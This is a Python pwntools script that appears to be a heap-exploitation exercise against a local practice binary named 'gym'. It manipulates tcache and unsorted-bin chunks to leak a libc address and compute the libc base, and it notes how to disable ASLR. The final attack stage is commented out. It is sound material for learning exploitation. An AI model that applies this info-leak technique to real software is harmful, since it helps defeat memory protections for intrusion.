#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
# To disable ASLR, run this first: setarch `uname -m` -R /bin/bash

from pwn import process, gdb, args, p64, ELF, context, u64

binary = './gym'

gs = """
break 118
continue
"""

e = ELF(binary)

END_OF_MENU = "e.g., r 1\n"


def malloc(p, size=8):
    p.sendline(b"m %d" % size)
    print("m %d" % size)
    print(p.recvuntil(END_OF_MENU).decode())


def free(p, index):
    p.sendline(b"f %d" % index)
    print("free")
    print(p.recvuntil(END_OF_MENU).decode())


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print(b"e %d %b" % (index, content))
    print(p.recvuntil(END_OF_MENU).decode())


def exit(p):
    p.sendline(b"0")


def list_ptr(p):
    p.sendline(b"l")
    print(p.recvuntil(END_OF_MENU).decode())


def read(p, index):
    p.sendline(b"r %d" % index)
    content = p.recvline()
    print(p.recvuntil(END_OF_MENU).decode())
    return content[:-1]


def get_smallbin(p, base):
    for _ in range(8):
        malloc(p, 0x90)

    for i in range(8):
        free(p, i + base)


def leak_libc(p):

    # 0. set up the layout of unsorted bin

    for _ in range(10):
        malloc(p, 0x300)

    for i in range(7):
        free(p, i)

    free(p, 7)

    # 1. read the content of the chunk in unsorted bin

    addr = read(p, 7)

    addr = u64(addr + b'\x00' * (8 - len(addr)))

    # 2. compute the base of libc by the content in fd pointer

    current_pointer = 0x7f0d067bbca0
    current_base = 0x7f0d063d0000

    offset = current_pointer - current_base

    base = addr - offset

    print(hex(base))

    import ipdb; ipdb.set_trace()
    return(base)


def main():
    if args.GDB:
        # p = gdb.debug(binary, gdbscript=gs)
        p = process(binary, aslr=True)
        gdb.attach(p.pid)
    else:
        p = process(binary, aslr=False)

    p.recvuntil(END_OF_MENU)
    leak_libc(p)
    # launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
